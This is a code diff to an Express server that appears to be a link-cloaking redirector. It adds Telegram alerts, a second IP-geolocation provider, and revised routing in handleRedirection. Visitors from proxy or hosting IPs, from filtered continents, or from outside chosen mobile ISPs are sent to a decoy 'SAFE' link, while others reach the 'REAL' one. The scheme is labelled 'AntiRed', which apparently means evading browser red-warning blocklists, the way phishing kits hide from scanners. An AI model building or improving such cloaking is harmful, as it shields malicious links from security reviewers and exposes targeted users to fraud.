@@ -971,6 +971,29 @@ app.post('/api/profile/update', requireAuth, apiLimiter, asyncHandler(async (req
 // `connect-request` is called by the dashboard to mint a one-time code that
 // the user redeems in the bot via /start <code>. `webhook` is called by
 // Telegram with each inbound Update.
+app.post('/api/telegram/test', requireAuth, apiLimiter, asyncHandler(async (req, res) => {
+    const { botToken, chatId } = req.body || {};
+    // Use provided values or fall back to user's saved settings or server defaults
+    const effectiveToken = botToken || (req.user.settings && req.user.settings.botToken) || process.env.TELEGRAM_BOT_TOKEN;
+    const effectiveChat = chatId || (req.user.settings && req.user.settings.chatId) || process.env.TELEGRAM_CHAT_ID;
+    
+    if (!effectiveToken || !effectiveChat) return res.status(400).json({ error: 'TOKEN_AND_CHAT_ID_REQUIRED' });
+
+    const message = `🛠 <b>Connection Test</b>\n\nYour Zencoder Proxy notification bridge is correctly configured for user: <code>${telegramEscape(req.user.name || req.user.username)}</code>`;
+
+    try {
+        await axios.post(`https://api.telegram.org/bot${effectiveToken}/sendMessage`, {
+            chat_id: effectiveChat,
+            text: message,
+            parse_mode: 'HTML'
+        });
+        res.json({ success: true });
+    } catch (err) {
+        console.error(`[Telegram] Test failed for user ${req.user.id}:`, err.response ? JSON.stringify(err.response.data) : err.message);
+        res.status(400).json({ error: err.response ? (err.response.data.description || 'TELEGRAM_ERROR') : 'CONNECTION_FAILED' });
+    }
+}));
+
 app.post('/api/telegram/connect-request', requireAuth, asyncHandler(async (req, res) => {
     if (!bot.isBotEnabled()) {
         return res.status(503).json({ error: 'TELEGRAM_BOT_TOKEN not configured on the server' });
@@ -1863,19 +1886,50 @@ async function lookupIpGeo(ip) {
             }
         }
 
-        const response = await axios.get(
+        // Fallback 1: ip-api.com (HTTP only for free tier)
+        const ipApiRes = await axios.get(
             `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,country,countryCode,regionName,city,isp,org,as,proxy,hosting,query,continentCode`,
             { timeout: 5000 }
-        );
-        const data = response.data;
-        if (data && data.status === 'success') {
+        ).catch(e => {
+            console.warn(`[Proxy] ip-api.com failed for ${ip}: ${e.message}`);
+            return null;
+        });
+
+        if (ipApiRes && ipApiRes.data && ipApiRes.data.status === 'success') {
+            const data = ipApiRes.data;
             ipGeoCache.set(ip, { data, expiresAt: now + IP_GEO_CACHE_TTL_MS });
             return data;
-        } else {
-            console.warn(`[Proxy] IP lookup failed for ${ip} (ip-api): ${data.message || 'Unknown error'}`);
-            // Cache negative result briefly
-            ipGeoCache.set(ip, { data: null, expiresAt: now + 60 * 1000 });
         }
+
+        // Fallback 2: ipwho.is (HTTPS supported, free up to 10k/month)
+        const ipwhoRes = await axios.get(`https://ipwho.is/${encodeURIComponent(ip)}`, { timeout: 5000 })
+            .catch(e => {
+                console.warn(`[Proxy] ipwho.is failed for ${ip}: ${e.message}`);
+                return null;
+            });
+
+        if (ipwhoRes && ipwhoRes.data && ipwhoRes.data.success) {
+            const d = ipwhoRes.data;
+            const data = {
+                status: 'success',
+                country: d.country || 'Unknown',
+                countryCode: d.country_code || 'UN',
+                regionName: d.region || 'Unknown',
+                city: d.city || 'Unknown',
+                isp: d.connection ? d.connection.isp : 'Unknown',
+                org: d.connection ? d.connection.org : 'Unknown',
+                proxy: d.security ? d.security.proxy : false,
+                hosting: d.security ? d.security.hosting : false,
+                continentCode: d.continent_code || 'UN',
+                query: ip
+            };
+            ipGeoCache.set(ip, { data, expiresAt: now + IP_GEO_CACHE_TTL_MS });
+            return data;
+        }
+
+        console.error(`[Proxy] All IP lookup providers failed for ${ip}`);
+        // Cache negative result briefly
+        ipGeoCache.set(ip, { data: null, expiresAt: now + 60 * 1000 });
     } catch (err) {
         console.error(`[Proxy] IP lookup error for ${ip}:`, err.message);
         // Cache negative result briefly
@@ -1998,21 +2052,6 @@ async function handleRedirection(user, req, res, linkData) {
         }
     }
 
-    // 2b. Continent Filtering (Africa / Europe)
-    if (data && data.status === 'success') {
-        const continent = data.continentCode; // 'AF', 'EU', 'NA', 'AS', 'SA', 'OC', 'AN'
-        if (!useAllowAfrica && continent === 'AF') {
-            return res.redirect(nonRealLink);
-        }
-        if (!useAllowEurope && continent === 'EU') {
-            return res.redirect(nonRealLink);
-        }
-    }
-
-    const isProxy = data && data.proxy === true;
-    const isHosting = data && data.hosting === true;
-    const isSuspicious = isProxy || isHosting;
-
     // 4. Filtering Logic
     let targetUrl = realLink;
     let redirectReason = null;
@@ -2026,12 +2065,21 @@ async function handleRedirection(user, req, res, linkData) {
     } else if (useAntiRed && isSuspicious) {
         targetUrl = nonRealLink;
         redirectReason = `AntiRed (${isProxy ? 'Proxy' : ''}${isProxy && isHosting ? '+' : ''}${isHosting ? 'Hosting' : ''})`;
-    } else if (useIspFilter && data && data.status === 'success') {
-        const userISP = (data.isp || data.org || "").toUpperCase();
-        const matches = (useMobileIsps || []).some(isp => isp && userISP.includes(isp.toUpperCase()));
-        if (!matches) {
+    } else if (data && data.status === 'success') {
+        const continent = data.continentCode; // 'AF', 'EU', 'NA', 'AS', 'SA', 'OC', 'AN'
+        if (!useAllowAfrica && continent === 'AF') {
             targetUrl = nonRealLink;
-            redirectReason = 'ISP Filter';
+            redirectReason = 'Continent Filter (Africa)';
+        } else if (!useAllowEurope && continent === 'EU') {
+            targetUrl = nonRealLink;
+            redirectReason = 'Continent Filter (Europe)';
+        } else if (useIspFilter) {
+            const userISP = (data.isp || data.org || "").toUpperCase();
+            const matches = (useMobileIsps || []).some(isp => isp && userISP.includes(isp.toUpperCase()));
+            if (!matches) {
+                targetUrl = nonRealLink;
+                redirectReason = 'ISP Filter';
+            }
         }
     }
 
@@ -2070,13 +2118,16 @@ async function handleRedirection(user, req, res, linkData) {
             `🎯 <b>Target:</b> <code>${targetUrl === realLink ? 'REAL' : 'SAFE'}</code>` +
             (redirectReason ? `\n🛡️ <b>Reason:</b> <code>${telegramEscape(redirectReason)}</code>` : '');
 
+        console.log(`[Proxy] Sending Telegram notification for user ${user.id} to chat ${chatId}`);
         axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             chat_id: chatId,
             text: message,
             parse_mode: 'HTML',
             disable_web_page_preview: true
+        }).then(() => {
+            console.log(`[Proxy] Telegram notification sent successfully for user ${user.id}`);
         }).catch(err => {
-            console.error(`[Proxy] Telegram notify failed for user ${user.id}:`, err.message);
+            console.error(`[Proxy] Telegram notify failed for user ${user.id}:`, err.response ? JSON.stringify(err.response.data) : err.message);
         });
     }
 
